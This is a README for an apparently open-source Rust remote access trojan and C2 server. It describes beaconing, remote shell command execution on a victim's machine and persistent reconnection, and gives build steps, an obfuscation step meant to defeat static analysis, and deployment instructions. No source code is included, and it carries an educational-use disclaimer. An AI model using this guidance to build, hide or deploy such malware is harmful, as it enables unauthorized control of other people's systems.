# Remote Access Trojan (RAT) with C2 Server

## Overview
This project consists of a **Remote Access Trojan (RAT)** and a **Command and Control (C2) Server** that communicate over a **TCP connection**. The RAT beacons out to the C2 server, waits for commands, executes them on the victim's machine, and sends back the output.

## Features
- **Beaconing:** The RAT continuously attempts to establish a connection with the C2 server.
- **Command Execution:** The C2 server can issue shell commands to the RAT.
- **Output Transmission:** The RAT sends back the command output to the C2 server.
- **Persistence:** The RAT will keep retrying connection if the C2 server is unavailable.

## Project Structure
```
├── rat
│   ├── src
│   │   ├── main.rs   # RAT implementation
|   |   |
|   |   ├── obfuscated_main.rs  # Obfuscated source code for the RAT
|   |   
│   ├── Cargo.toml    # Rust dependencies
│
├── c2c
│   ├── src
│   │   ├── main.rs   # C2 Server implementation
│   ├── Cargo.toml    # Rust dependencies
|
|── LICENSE           # MIT License
|
└── .gitignore        # Ignores all files except main.rs in RAT & C2C
```

## Installation & Usage

### Prerequisites
- Install [Rust](https://www.rust-lang.org/tools/install)

### Obfuscate the release binary
You may choose to copy the obfuscated source code into the `main.rs` file to make static analysis even more difficult.
```bash
cd rat && cat src/obfuscated_main.rs > main.rs
```

### Build the RAT & C2 Server
```bash
cd rat && cargo build --release
cd ../c2c && cargo build --release
```

### Running the C2 Server
Start the C2 server to listen for incoming RAT connections:
```bash
./target/release/c2c
```

### Running the RAT
Deploy the RAT on the target system and execute:
```bash
./target/release/rat
```

### Issuing Commands
Once the RAT is connected, the C2 server can send shell commands. Example:
```bash
C2> whoami
C2> ls -la
```
The RAT will execute the commands and return the output.

## Security Considerations
> **This project is for educational and research purposes only. Unauthorized use is illegal.**

## License
This project is licensed under the MIT License.